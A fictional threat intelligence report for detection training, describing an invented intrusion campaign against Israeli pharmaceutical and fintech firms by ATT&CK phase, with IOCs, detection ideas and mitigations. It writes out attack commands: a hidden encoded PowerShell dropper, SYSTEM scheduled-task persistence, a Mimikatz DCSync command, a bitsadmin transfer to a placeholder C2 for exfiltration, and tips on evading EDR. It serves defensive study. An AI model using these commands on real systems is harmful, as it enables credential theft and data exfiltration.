# Operation Desert Cipher: Iranian-Nexus Intrusion Campaign Targeting Israeli Pharmaceutical and FinTech Sectors

**Publisher:** Mandiant Intelligence (fictional report — training purposes only)  
**Report ID:** MR-2024-1147  
**TLP:** WHITE  
**Date:** November 2024  
**Confidence:** Moderate — assessed with moderate confidence to be Iranian-nexus intrusion cluster  
**Attribution:** Unattributed to named group — partial TTP overlap with documented Iranian tradecraft; insufficient evidence for definitive attribution

---

> **TRAINING NOTE:** This is a fictional intelligence report created for the CTI Lab adversary
> emulation exercises (Assignments 4 and 8). All organizations, names, IPs, domains, and
> indicators are fabricated. The TTPs are based on publicly documented Iranian-nexus tradecraft
> from real Mandiant, Microsoft, and CISA reports. The procedural detail is sufficiently
> specific to enable realistic detection rule testing.

---

## Executive Summary

Mandiant has identified an intrusion campaign, tracked as UNC-CIPHER, active from
**Q2 2024 through Q4 2024** with confirmed victims in Israel, the UAE, and Cyprus.
The campaign targets Israeli pharmaceutical companies with FDA-pending drug approval
processes and Israeli financial technology companies processing cross-border payments.

The cluster demonstrates dual motivation: **intellectual property theft** (pharmaceutical
formulas, clinical trial data, regulatory submissions) and **financial access** (payment
processor API credentials, card token vaults, SWIFT credentials). This combination is
atypical and suggests either a single state-directed actor with multiple tasking mandates
or a cluster operating under a broad "any valuable data" collection directive.

UNC-CIPHER has successfully compromised at least **four Israeli organizations** between
May and October 2024. Dwell time ranged from 19 to 47 days before detection.

---

## Victims and Targeting

| Victim Type | Country | Data Targeted | Dwell Time |
|---|---|---|---|
| Pharmaceutical manufacturer | Israel | FDA approval documents, drug formulas | 47 days |
| Pharmaceutical distributor | UAE | Drug distribution contracts, pricing | 31 days |
| Payment processor (mid-size) | Israel | Merchant API credentials, partial CDR | 19 days |
| Biotech startup | Cyprus | Phase II trial data, investor materials | 28 days |

**Targeting pattern:** All Israeli victims had either US FDA pending approvals or active
payment processing contracts with US partners. The adversary appears to specifically value
IP with US market relevance.

---

## Initial Access

### Method 1: Adversary-in-the-Middle (AiTM) Phishing — T1566.001 + T1557

UNC-CIPHER's primary initial access method is AiTM phishing using a reverse-proxy
framework (consistent with Evilginx2 or a custom equivalent). The technique bypasses MFA
by proxying the real authentication session and capturing the authenticated session cookie.

**Targeting:** Finance department staff, IT administrators, and R&D licensing coordinators.
Victim selection shows prior reconnaissance — emails reference real internal project names
or personnel names harvested from LinkedIn.

**Email characteristics:**
- Sender domains registered 3–14 days before campaign; registrar: Namecheap or Porkbun
- Subject lines referencing urgent financial or compliance actions:
  - "Q[N] Financial Report — Board Review Required"
  - "MFA Re-enrollment Required — Action by [date 3 days out]"
  - "Regulatory Filing Update — Immediate Attention"
- Attachments: XLSM (Excel macro-enabled) or DOCM (Word macro-enabled) or ISO (LNK dropper)
- Alternative: Hyperlink to AiTM phishing portal imitating Microsoft 365 or company SSO portal

**Delivery observation:** ATP sandbox evasion observed. Attachments deliver benign content
on first open (sandbox), then check a time-based condition before executing on victim machine.
At least two victims had ATP sandbox detonation enabled — the sandbox reported clean.

### Method 2: Valid Accounts — T1078.003

In two confirmed victims, UNC-CIPHER obtained valid VPN or application credentials prior
to initial access. Source of credentials: assessed as prior AiTM campaign against
employees' personal email accounts or public credential leaks (paste sites).

---

## Execution

### PowerShell via Macro/LNK Dropper — T1059.001

After attachment execution, a PowerShell command is executed:

```
powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand [base64]
```

The base64 command decodes to a WebClient download of a second-stage implant from
adversary-controlled HTTPS infrastructure. The implant is saved to one of:
- `C:\Windows\Temp\` with a name mimicking system processes (e.g., `svchost32.exe`, `svchosts.exe`)
- `C:\ProgramData\Microsoft\[legitimate-looking-subfolder]\[name].exe`
- `C:\Users\[user]\AppData\Roaming\Microsoft\[name].exe`

### VBScript via Word Macro — T1059.005

WINWORD.EXE spawning WScript.exe observed in two victims. VBScript executes the PowerShell
dropper.

---

## Persistence

### Scheduled Task — T1053.005

Persistence via scheduled task created with:
```
schtasks.exe /Create /SC ONLOGON /TN "[legitimate-looking-name]" /TR "[implant path]" /RU SYSTEM /F
```
Task names observed: "Windows Update Helper", "Microsoft Sync Service", "Device Health Monitor"

### Registry Run Key — T1547.001

Persistence also achieved via HKCU Run key:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\[key-name]
```
Key names observed: "WindowsTelemetrySvc", "MicrosoftSyncHelper", "DeviceHealthCheck"

**Note:** HKCU Run keys are often missed by detection rules scoped to HKLM only.

---

## Defense Evasion

### Domain Fronting / CDN C2 — T1090.004

C2 traffic fronted through Cloudflare CDN. The implant sends HTTPS requests to Cloudflare
IP space, with the `Host:` header specifying the actual C2 domain. Network-level inspection
sees only Cloudflare IP addresses.

### Process Injection — T1055.012

In two confirmed victims, the implant performs process hollowing into a legitimate Windows
process (typically `svchost.exe` or `RuntimeBroker.exe`) to evade process-based detections.

### LSASS via OpenProcess — T1003.001

Credential access achieved by opening LSASS process with:
```
GrantedAccess: 0x1010  (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION)
```
This access mask is lower than the commonly-detected 0x1fffff but sufficient for LSASS
memory reading with the right technique. Some EDR rules tuned for 0x1fffff miss this.

---

## Lateral Movement

### Pass-the-Hash / RDP — T1021.001, T1550.002

After LSASS dump, UNC-CIPHER uses extracted NTLM hashes for lateral movement to file
servers and high-value targets via RDP. No password cracking observed — direct hash use.

### DCSync — T1003.006

In all four confirmed victims where the adversary reached domain-joined infrastructure,
a DCSync operation was performed:
- Mimikatz `lsadump::dcsync /user:krbtgt` (or equivalent)
- Replication access: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
- Targets: krbtgt, Administrator, and any account name containing "svc_" or "admin"

---

## Collection

### File and Directory Discovery — T1083

The adversary consistently looks for:
- R&D file shares (`\\[server]\R&D\`, `\\[server]\Formulas\`, `\\[server]\ClinicalData\`)
- Financial file shares (`\\[server]\Finance\`, `\\[server]\LicenseDeals\`)
- API credential files (`.env`, `secrets.yml`, `config.json` on developer workstations)

Discovery commands observed:
```
Get-ChildItem -Path \\[server]\[share] -Recurse | Select Name,Length,LastWriteTime
dir \\[server]\[share] /s /b
```

### Data Staging — T1074.001

Files staged in `C:\Windows\Temp\~[random-4-chars][year]\` before exfiltration.

---

## Exfiltration

### BITS Jobs to C2 — T1197

Primary exfiltration method: BITS (Background Intelligent Transfer Service) jobs.
```
bitsadmin /transfer "[job-name]" /download /priority FOREGROUND [C2-URL] C:\Windows\Temp\dummy.bin
```
BITS jobs run as SYSTEM under `svchost.exe` and survive reboots. Traffic appears as
Windows Update traffic to network monitoring. Outbound data embedded in HTTP POST body
of the "download" request (reversed direction — data leaves in the request, not the response).

### DNS Exfiltration (secondary) — T1048.003

Observed in one victim as a fallback. High-frequency TXT queries:
`[encoded-data-chunk].[campaign-id].cdn-sync-metrics[.]net`

---

## Indicators of Compromise

> All IPs and domains below are fictional (documentation ranges / invented domains).
> Do not attempt to block real infrastructure based on these.

### Domains
| Domain | Role | Registration Pattern |
|---|---|---|
| `telemetry-cdn-services[.]biz` | Stage 1 C2 | Registered via Namecheap 14 days before use |
| `update-sync-cdn[.]net` | Stage 2 C2 / exfil | Registered via Porkbun 7 days before use |
| `cdn-sync-metrics[.]net` | DNS exfil | Registered via Namecheap 3 days before use |
| `ms-device-sync[.]com` | Implant host | Registered via Porkbun 10 days before use |

### IP Addresses
| IP | Role | Notes |
|---|---|---|
| `203.0.113.87` | Primary C2 | Vultr VPS, Amsterdam (TEST-NET-3) |
| `198.51.100.22` | Secondary C2 | Vultr VPS, Frankfurt (TEST-NET-2) |
| `203.0.113.91` | Exfil endpoint | Same /24 as primary C2 |

### File Indicators
| Indicator | Type | Notes |
|---|---|---|
| `svchost32.exe` in `C:\Windows\Temp\` | Filename | Typosquats legitimate svchost.exe |
| `dsync.exe` in `C:\ProgramData\Microsoft\DeviceSync\` | Filename | DeviceSync folder created by adversary |
| SHA256: `1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b` | File hash | Stage 2 implant (sample A) |
| SHA256: `5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d` | File hash | XLSM dropper |

---

## Detection Opportunities

| Phase | Best Detection Point | Reason |
|---|---|---|
| Initial Access | AiTM token reuse from anomalous IP | Session cookie stolen by proxy; subsequent auth from different IP/ASN |
| Execution | PowerShell with -Enc + -NonI + -W Hidden | High-confidence behavioral indicator; rare in legitimate use |
| Persistence | HKCU Run key write by non-admin process | Adversary uses HKCU (not HKLM) to avoid admin requirement |
| Persistence | Scheduled task created by non-system process | schtasks.exe /Create with /RU SYSTEM from non-admin context is anomalous |
| Credential Access | LSASS access with 0x1010 mask | Lower access mask than commonly tuned rules; requires tuning |
| Lateral Movement | DCSync EID 4662 with DS-Replication-Get-Changes-All | Extremely rare in legitimate operations; almost no FPs |
| Exfiltration | BITS job to non-Microsoft ASN | BITS to Vultr VPS is not legitimate Windows Update behavior |

---

## Mitigations

1. **Protected Users security group** for all privileged accounts — prevents NTLM hash extraction via LSASS
2. **Credential Guard** — prevents LSASS memory reading via virtualization-based security
3. **PowerShell Constrained Language Mode** — prevents most Empire/Metasploit PS payloads
4. **ScriptBlock logging (EID 4104)** — decodes base64 at execution time regardless of encoding
5. **ASR rules** — block Office from creating child processes
6. **Conditional Access** — token binding or location-based policy reduces AiTM effectiveness
7. **BITS monitoring** — alert on BITS transfers to non-Microsoft ASNs
